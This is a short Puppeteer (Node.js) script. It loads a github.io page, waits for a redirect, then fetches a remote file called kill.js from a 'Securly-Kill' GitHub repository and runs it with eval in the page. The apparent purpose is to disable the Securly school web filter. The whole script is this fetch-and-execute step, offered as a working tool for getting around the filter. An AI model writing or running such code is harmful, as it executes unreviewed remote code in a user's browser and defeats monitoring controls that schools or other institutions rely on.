const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    // Enable request interception
    await page.setRequestInterception(true);

    // Monitor requests and log them
    page.on('request', (request) => {
        console.log(`Request: ${request.url()}`);
        request.continue();
    });

    // Monitor responses to detect redirection
    let redirectedUrl = null;
    page.on('response', async (response) => {
        if (response.status() === 200 && response.url() !== page.url()) {
            redirectedUrl = response.url();
            console.log(`Redirected to: ${redirectedUrl}`);
        }
    });

    try {
        // Navigate to the initial page
        const initialUrl = 'https://dy1ngrat.github.io/pupet/';
        await page.goto(initialUrl, { waitUntil: 'domcontentloaded' });

        // Wait for navigation/redirection to complete
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

        // Log the final URL after redirection
        const finalUrl = page.url();
        console.log(`Final URL: ${finalUrl}`);

        // Inject external script after redirection
        if (redirectedUrl || finalUrl !== initialUrl) {
            await page.evaluate(async () => {
                const scriptContent = await fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
                    .then((response) => response.text());
                eval(scriptContent);
            });
            console.log('Script injected and executed successfully!');
        } else {
            console.log('No redirection detected.');
        }

    } catch (error) {
        console.error('Error:', error);
    }

    // Keep the browser open
})();
